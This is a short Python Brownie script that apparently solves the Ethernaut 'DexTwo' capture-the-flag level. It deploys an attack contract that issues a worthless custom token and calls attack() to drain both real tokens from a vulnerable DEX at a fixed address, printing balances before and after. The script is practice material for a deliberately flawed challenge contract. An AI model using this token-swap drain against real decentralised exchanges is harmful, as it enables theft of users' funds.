from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from brownie import DexTwo, DexTwoAttack, network, Contract


def deploy_DexTwo():
    acc1 = get_account(index=1)
    dex = DexTwo.deploy(
        {"from": acc1},
    )
    return dex


def deploy_DexTwoAttack(dex):
    account = get_account()
    attack_contract = DexTwoAttack.deploy(
        dex,
        "new token",
        "nt",
        4,
        {"from": account},
    )
    return attack_contract


# helper function that print the supply of owner for both token
def print_balance(dex, owner, attack_contract):
    tok1 = dex.balanceOf(dex.token1(), owner)
    tok2 = dex.balanceOf(dex.token2(), owner)
    newtoken = dex.balanceOf(attack_contract, owner)
    print(f"tok1: {tok1}")
    print(f"tok2: {tok2}")
    print(f"new Token: {newtoken}")


def main():
    print(network.show_active())
    account = get_account()

    # dex = deploy_DexTwo()  # local testing
    dex_address = "0xFf3a8Bf0570BfFb10029AcA8c84a3355933004f2"
    dex = Contract.from_abi(
        DexTwo._name, dex_address, DexTwo.abi
    )  # dex instead of dex_address for local testing

    # deploy attack contract
    attack_contract = deploy_DexTwoAttack(dex)
    # dex = attack_contract.dex()  # local testing
    # dex = Contract.from_abi(DexTwo._name, dex, DexTwo.abi) # local testing

    # we start with 0 token1 ,0 token2 and 4 new token (account will have the token1 and 2, not the attack contract)
    print_balance(dex, attack_contract, attack_contract)
    attack_contract.attack({"from": account})
    # we endup with 100, 100 and 0 and more importantly for the level, the dex will have 0,0 and 4
    print_balance(dex, attack_contract, attack_contract)
